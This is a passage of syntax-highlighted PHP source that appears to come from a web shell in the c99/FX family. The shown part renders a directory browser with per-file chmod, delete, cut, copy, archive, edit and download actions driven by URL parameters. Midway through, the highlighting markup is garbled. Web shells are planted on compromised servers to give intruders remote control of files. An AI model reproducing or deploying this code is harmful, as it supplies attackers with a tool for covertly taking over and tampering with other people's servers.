          <span class="k">if</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=small_dir</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;CURDIR&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_lnk</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;UPDIR&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
              <span class="nv">$disppath</span> <span class="o">.=</span> <span class="s2">&quot; =&amp;gt; &quot;</span><span class="o">.</span><span class="nb">readlink</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
              <span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;LNK&quot;</span><span class="p">;</span>
              <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_lnk</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt; [&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;]&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
              <span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;DIR&quot;</span><span class="p">;</span>
              <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span>  <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$sort</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=small_dir</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt; [&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;]&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$type</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">elseif</span><span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
            <span class="nv">$c</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$ext</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
            <span class="nv">$ext</span> <span class="o">=</span> <span class="nv">$ext</span><span class="p">[</span><span class="nv">$c</span><span class="p">];</span>
            <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$ext</span><span class="p">);</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span>  <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_&quot;</span><span class="o">.</span><span class="nv">$ext</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt; &quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
          <span class="p">}</span>
          <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">,</span><span class="nv">$a</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span> <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span> <span class="p">}</span>
          <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=chmod&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$checkbox</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actbox[]</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">ls_reverse_all();</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$i</span><span class="o">--</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$checkbox</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actbox[]</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">actbox&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$checkbox</span><span class="s2"> &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=d&amp;d=&quot;</span><span class="o">.</span><span class="nv">$uv</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_diz</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Info</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt; &quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$checkbox</span><span class="s2"> &quot;</span><span class="o">.</span>
                     <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;ft=info&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=ext_diz</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Info</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt; &quot;</span><span class="o">.</span>
                     <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;ft=edit&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=change</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Edit</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt; &quot;</span><span class="o">.</span>
                     <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=&quot;</span><span class="o">.</span><span class="nv">$uo</span><span class="o">.</span><span class="s2">&quot;&amp;ft=download&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=download</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Download</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">==</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span> <span class="p">}</span>
          <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="c1">#Listing Files &amp; Folders</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=barheader&amp;gt;.: &quot;</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$fx_infohead</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="nv">$fx_infohead</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;Directory List (&quot;</span><span class="o">.</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; files and &quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">])</span><span class="o">+</span><span class="nb">count</span><span class="p">(</span><span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">]))</span><span class="o">.</span><span class="s2">&quot; folders)&quot;</span><span class="p">;</span> <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot; :.&amp;lt;/div&amp;gt;</span><span class="se">\n\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">ls_form</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="si">$surl\</span><span class="s2">&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="nx">POST</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;.</span>
<span class="s2">           &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">hidden</span> <span class="nx">name</span><span class="o">=</span><span class="nx">act</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$dspact\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;.</span>
<span class="s2">           &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">hidden</span> <span class="nx">name</span><span class="o">=</span><span class="nx">d</span> <span class="nx">value</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;</span><span class="si">$d\</span><span class="s2">&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">?&gt;</span>


<span class="s2">&amp;lt;table class=&quot;</span><span class="nx">explorer</span><span class="s2">&quot;&amp;gt;</span>
<span class="s2">&lt;?php</span>
<span class="s2">      </span><span class="si">$table</span><span class="s2"> = array_merge(</span><span class="si">$tab[&quot;cols&quot;]</span><span class="s2">,</span><span class="si">$tab[&quot;head&quot;]</span><span class="s2">,</span><span class="si">$tab[&quot;folders&quot;]</span><span class="s2">,</span><span class="si">$tab[&quot;links&quot;]</span><span class="s2">,</span><span class="si">$tab[&quot;files&quot;]</span><span class="s2">);</span>
<span class="s2">      foreach(</span><span class="si">$table</span><span class="s2"> as </span><span class="si">$row</span><span class="s2">) {</span>
<span class="s2">        echo &quot;</span><span class="nx">\t</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">        foreach(</span><span class="si">$row</span><span class="s2"> as </span><span class="si">$v</span><span class="s2">) { echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.</span><span class="si">$v</span><span class="s2">.&quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">td</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;; }</span>
<span class="s2">        echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">tr</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">      }</span>
<span class="s2">?&gt;</span>


<span class="s2">&amp;lt;/table&amp;gt;</span>
<span class="s2">&amp;lt;div align=&quot;</span><span class="nx">right</span><span class="s2">&quot;&amp;gt;</span>
<span class="s2">    &amp;lt;script language=&quot;</span><span class="nx">javascript</span><span class="s2">&quot;&amp;gt;</span>
<span class="s2">    function ls_setcheckboxall(status) {</span>
<span class="s2">      var id = 1; var num = &lt;?php echo(count(</span><span class="si">$table</span><span class="s2">) - 2); ?&gt;;</span>
<span class="s2">      while (id &amp;lt;= num) {</span>
<span class="s2">        document.getElementById(&#39;actbox&#39;+id).checked = status; id++;</span>
<span class="s2">      }</span>
<span class="s2">    }</span>
<span class="s2">    function ls_reverse_all() {</span>
<span class="s2">      var id = 1; var num = &lt;?php echo(count(</span><span class="si">$table</span><span class="s2">) - 2); ?&gt;;</span>
<span class="s2">      while (id &amp;lt;= num) {</span>
<span class="s2">        document.getElementById(&#39;actbox&#39;+id).checked = !document.getElementById(&#39;actbox&#39;+id).checked; id++;</span>
<span class="s2">      }</span>
<span class="s2">    }</span>
<span class="s2">    &amp;lt;/script&amp;gt;</span>
<span class="s2">    &amp;lt;input type=&quot;</span><span class="nx">button</span><span class="s2">&quot; onclick=&quot;</span><span class="nx">ls_setcheckboxall</span><span class="p">(</span><span class="k">true</span><span class="p">);</span><span class="s2">&quot; value=&quot;</span><span class="nx">Check</span> <span class="nx">all</span><span class="s2">&quot;&amp;gt;</span>
<span class="s2">    &amp;lt;input type=&quot;</span><span class="nx">button</span><span class="s2">&quot; onclick=&quot;</span><span class="nx">ls_setcheckboxall</span><span class="p">(</span><span class="k">false</span><span class="p">);</span><span class="s2">&quot; value=&quot;</span><span class="nx">Uncheck</span> <span class="nx">all</span><span class="s2">&quot;&amp;gt;</span>
<span class="s2">&lt;?php</span>
<span class="s2">      if (count(array_merge(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2">,</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2">)) &amp;gt; 0) {</span>
<span class="s2">        echo &quot;</span><span class="nx">\t</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actarcbuff</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Archive it!</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="o">.</span>
             <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actarcbuff_path</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">fx_archive_&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)</span><span class="o">.</span><span class="nb">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1000</span><span class="p">)),</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.tar.gz</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actpastebuff</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Paste</span><span class="se">\&quot;</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">actemptybuff</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Empty buffer</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\n\t</span><span class="s2">&quot;</span><span class="o">.</span>
           <span class="s2">&quot;&amp;lt;select name=act&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
             <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$act</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;With checked:&amp;lt;/option&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
      <span class="nv">$f_acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;delete&quot;</span><span class="p">,</span><span class="s2">&quot;chmod&quot;</span><span class="p">,</span><span class="s2">&quot;cut&quot;</span><span class="p">,</span><span class="s2">&quot;copy&quot;</span><span class="p">,</span><span class="s2">&quot;unselect&quot;</span><span class="p">);</span>
      <span class="k">foreach</span> <span class="p">(</span><span class="nv">$f_acts</span> <span class="k">as</span> <span class="nv">$f1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&amp;lt;option value=</span><span class="se">\&quot;</span><span class="si">$f1\</span><span class="s2">&quot;&quot;.(</span><span class="si">$dspact</span><span class="s2"> == &quot;</span><span class="nv">$f1</span><span class="s2">&quot;?&quot;</span> <span class="nx">selected</span><span class="s2">&quot;:&quot;&quot;).&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$f1</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">option</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">      }</span>
<span class="s2">      ?&gt;</span>


<span class="s2">    &amp;lt;/select&amp;gt;</span>
<span class="s2">    &amp;lt;input type=&quot;</span><span class="nx">submit</span><span class="s2">&quot; value=&quot;</span><span class="nx">Confirm</span><span class="s2">&quot;&amp;gt;</span>
<span class="s2">&amp;lt;/div&amp;gt;</span>
<span class="s2">&amp;lt;/form&amp;gt;</span>
<span class="s2">&lt;?php</span>
<span class="s2">    }</span>
<span class="s2">  }</span>
<span class="s2">  ###[ FILE ]###</span>
<span class="s2">  if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">f</span><span class="s2">&quot;) {</span>
<span class="s2">    echo &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">div</span> <span class="nx">align</span><span class="o">=</span><span class="nx">left</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;;</span>
<span class="s2">    if (!isset(</span><span class="si">$ft</span><span class="s2">)) { </span><span class="si">$ft</span><span class="s2"> = &quot;&quot;; }</span>
<span class="s2">    if (!isset(</span><span class="si">$newwin</span><span class="s2">)) { </span><span class="si">$newwin</span><span class="s2"> = &quot;&quot;; }</span>
<span class="s2">    if ((!is_readable(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">) or is_dir(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">)) and </span><span class="si">$ft</span><span class="s2"> != &quot;</span><span class="nx">edit</span><span class="s2">&quot;) {</span>
<span class="s2">      if (file_exists(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">)) {</span>
<span class="s2">        disp_error(&quot;</span><span class="nx">Access</span> <span class="nx">denied</span><span class="o">!&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">br</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$f</span><span class="s2">));</span>
<span class="s2">      }</span>
<span class="s2">      else {</span>
<span class="s2">        disp_error(&quot;</span><span class="nx">File</span> <span class="nx">doesn</span><span class="s1">&#39;t exists: &quot;.htmlspecialchars($d.$f).&quot;&amp;lt;br&amp;gt;\n&quot;.</span>
